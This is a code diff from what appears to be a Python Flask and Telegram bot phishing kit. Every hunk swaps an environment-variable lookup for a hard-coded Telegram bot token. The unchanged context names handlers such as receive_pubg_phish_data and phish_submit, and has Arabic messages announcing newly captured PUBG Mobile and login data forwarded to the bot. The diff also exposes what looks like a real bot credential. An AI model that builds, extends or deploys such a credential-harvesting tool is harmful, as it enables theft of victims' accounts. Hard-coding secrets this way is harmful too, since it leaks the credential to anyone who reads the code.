@@ -1229,7 +1229,7 @@ def execute_http_request_by_link(method, link_id, user_id):
             
             decoded_response = decode_response_content(response)
             
-            bot_token = os.environ.get('BOT_TOKEN', '')
+            bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
             if bot_token:
                 send_response_to_telegram(bot_token, user_id, request_data, response, decoded_response)
             
@@ -1469,7 +1469,7 @@ def execute_multi_http_requests_with_redirect(link_id, user_id):
             futures = [executor.submit(execute_single_request, req) for req in requests_list]
             results = [future.result() for future in concurrent.futures.as_completed(futures)]
         
-        bot_token = os.environ.get('BOT_TOKEN', '')
+        bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
         if bot_token:
             def send_multi_results():
                 try:
@@ -1594,7 +1594,7 @@ def execute_http_request_with_redirect(method, link_id, user_id):
             
             decoded_response = decode_response_content(response)
             
-            bot_token = os.environ.get('BOT_TOKEN', '')
+            bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
             if bot_token:
                 send_response_to_telegram(bot_token, user_id, request_data, response, decoded_response)
             
@@ -1725,7 +1725,7 @@ def execute_http_request(request_id, user_id):
             
             decoded_response = decode_response_content(response)
             
-            bot_token = os.environ.get('BOT_TOKEN', '')
+            bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
             if bot_token:
                 send_response_to_telegram(bot_token, user_id, request_data, response, decoded_response)
             
@@ -1905,7 +1905,7 @@ def send_data():
         session = sessions[page_id]
         user_id = session.get('user_id')
         
-        bot_token = os.environ.get('BOT_TOKEN', '')
+        bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
         
         if not bot_token:
             return jsonify({'success': False, 'error': 'BOT_TOKEN not configured'}), 500
@@ -2218,7 +2218,7 @@ def block_ip():
         sessions = load_sessions()
         if page_id in sessions:
             user_id = sessions[page_id].get('user_id')
-            bot_token = os.environ.get('BOT_TOKEN', '')
+            bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
             
             if user_id and bot_token:
                 block_message = f"""
@@ -2401,7 +2401,7 @@ def receive_pubg_phish_data():
         session = sessions[page_id]
         user_id = session.get('user_id', page_id)
         
-        bot_token = os.environ.get('BOT_TOKEN', '')
+        bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
         if bot_token:
             message = f"""
 🎮 بيانات PUBG Mobile جديدة!
@@ -2748,7 +2748,7 @@ def phish_submit(platform, page_id, link_id=None):
         session = sessions[page_id]
         user_id = session.get('user_id', page_id)
         
-        bot_token = os.environ.get('BOT_TOKEN', '')
+        bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
         if bot_token:
             message = f"""
 🎣 بيانات تسجيل دخول جديدة!
@@ -6453,7 +6453,7 @@ async def search_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(message, parse_mode='HTML')
 
 def run_bot():
-    bot_token = os.environ.get('BOT_TOKEN', '')
+    bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
     
     if not bot_token:
         print("❌ خطأ: لم يتم تعيين BOT_TOKEN في المتغيرات البيئية!")
@@ -6483,7 +6483,7 @@ def run_server():
     app.run(host='0.0.0.0', port=13760, debug=False)
 
 if __name__ == '__main__':
-    bot_token = os.environ.get('BOT_TOKEN', '')
+    bot_token = "8244157179:AAGHOOQbcNJ8YH2eZ9MxgdqJve8MlTXlk60"
     
     if not bot_token:
         print("\n" + "="*50)
